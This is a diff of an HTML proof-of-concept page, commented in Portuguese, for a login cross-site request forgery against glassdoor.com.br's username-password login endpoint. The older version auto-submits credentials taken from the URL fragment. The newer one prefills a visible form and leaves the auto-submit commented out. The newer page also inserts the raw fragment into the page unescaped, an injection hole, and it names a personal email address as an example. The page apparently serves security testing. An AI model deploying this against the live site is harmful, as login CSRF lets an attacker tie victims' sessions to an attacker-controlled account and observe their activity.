@@ -1,29 +1,47 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>PoC Login CSRF (urlencoded)</title>
+<title>PoC Login CSRF (visível)</title>
 <body>
+<h2>PoC Login CSRF (urlencoded)</h2>
+<p>Esta página envia um POST para <code>/auth/login/username-password</code>.</p>
+
+<div id="debug" style="padding:8px;border:1px dashed #999;margin:10px 0;"></div>
+
+<form id="f" action="https://www.glassdoor.com.br/auth/login/username-password" method="POST">
+  <label>Email (username):<br><input id="u" name="username" style="width:400px"></label><br><br>
+  <label>Senha (password):<br><input id="p" name="password" type="text" style="width:400px"></label><br><br>
+  <label>postLoginUrl:<br><input id="r" name="postLoginUrl" value="" style="width:400px"></label><br><br>
+  <button type="submit">ENVIAR (fazer POST)</button>
+</form>
+
 <script>
-  // Lê as credenciais do fragmento da URL: #u=<email>&p=<senha>
-  const params = new URLSearchParams(location.hash.slice(1));
-  const u = params.get('u') || '';
-  const p = params.get('p') || '';
-  // Monta um <form> application/x-www-form-urlencoded
-  const f = document.createElement('form');
-  f.action = 'https://www.glassdoor.com.br/auth/login/username-password';
-  f.method = 'POST';
+(function(){
+  // Lê fragmento: #u=...&p=...
+  const frag = location.hash || '';
+  const dbg = document.getElementById('debug');
+  dbg.innerHTML = '<b>Fragmento atual:</b> <code>' + (frag || '(vazio)') + '</code><br>'
+    + 'Exemplo de uso: <code>#u=seu-email%40exemplo.com&p=SuaSenha123!</code>';
 
-  const iU = document.createElement('input'); iU.name = 'username'; iU.value = u;
-  const iP = document.createElement('input'); iP.name = 'password'; iP.value = p;
-  const iR = document.createElement('input'); iR.name = 'postLoginUrl'; iR.value = '';
-
-  f.appendChild(iU); f.appendChild(iP); f.appendChild(iR);
-  document.body.appendChild(f);
-
-  // Submete automaticamente
-  if (u && p) {
-    f.submit();
-  } else {
-    document.write('<p>Adicione <code>#u=&lt;email&gt;&amp;p=&lt;senha&gt;</code> à URL e recarregue.</p>');
+  // Tenta parsear os valores
+  if (frag.startsWith('#')) {
+    const params = new URLSearchParams(frag.slice(1));
+    const u = params.get('u');
+    const p = params.get('p');
+    if (u) document.getElementById('u').value = u;
+    if (p) document.getElementById('p').value = p;
+    if (u && p) {
+      dbg.innerHTML += '<br><span style="color:green">OK: valores do fragmento aplicados aos campos acima.</span>';
+      // Se quiser auto-enviar quando houver u & p, descomente a linha abaixo:
+      // document.getElementById('f').submit();
+    } else {
+      dbg.innerHTML += '<br><span style="color:#c00">Atenção: não encontrei u e/ou p no fragmento.</span>';
+    }
   }
+})();
 </script>
+
+<p style="margin-top:20px;font-size:12px;color:#555">
+Dicas: use <code>%40</code> no lugar de <code>@</code> (ex.: <code>jonata.uberro%40gmail.com</code>).
+Se sua senha tiver espaços, use <code>%20</code>. Caracteres como <code>&</code> e <code>#</code> precisam ser escapados.
+</p>
 </body>
